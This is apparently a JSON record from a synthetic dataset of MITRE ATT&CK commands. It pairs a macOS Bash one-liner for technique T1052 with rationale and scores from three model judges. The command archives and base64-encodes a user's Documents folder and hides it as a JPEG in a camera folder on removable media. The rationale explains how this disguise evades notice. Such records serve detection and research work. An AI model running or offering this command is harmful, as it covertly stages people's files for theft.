@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - \"$HOME/Documents\" | base64 | dd of=\"/Volumes/CANON_DC/DCIM/100CANON/IMG_4021.JPG\" bs=1m conv=sync && sync",
+  "explanation": "Encodes an archive of Documents as base64 and writes it to a JPEG-named file in a camera-style DCIM folder on the external drive using dd.",
+  "rationale_steps": [
+    "Archive Documents to reduce size and consolidate.",
+    "Base64-encode to appear as text while hiding binary signature.",
+    "Write to a camera-like directory path to blend in on removable media.",
+    "Sync to commit data for offline transport."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-4dcaa55f",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed pipeline with balanced quoting and valid tar/base64/dd options for macOS, proper separators, and no parsing errors.",
+        "semantic_score": 4,
+        "semantic_justification": "It archives and base64-encodes Documents and writes to a JPEG-named file in a DCIM path on an external volume consistent with T1052, though conv=sync with bs=1m may introduce trailing NUL padding that complicates later decoding.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:48:57.733117Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed with proper piping, quoting, and flag usage, though the `bs=1m` flag uses macOS/BSD `dd` syntax which is valid on macOS but the base64 output piped directly to `dd` without binary handling could cause minor issues in practice.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1052 by archiving Documents with tar, encoding as base64 to obfuscate content, writing to a JPEG-named file in a realistic camera DCIM folder structure on an external volume using dd, and ensuring data is flushed with sync — all consistent with staging and disguising data for physical medium exfiltration.",
+        "combined_score": 4.5,
+        "confidence": 0.88,
+        "timestamp": "2026-02-18T22:37:17.367188Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses perfectly valid Bash syntax, properly balanced quotes, and standard flags for tar, base64, and dd on macOS.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements the technique by staging, compressing, obfuscating with base64, and writing data to a realistic physical medium path using a deceptive filename.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:37:17.614079Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
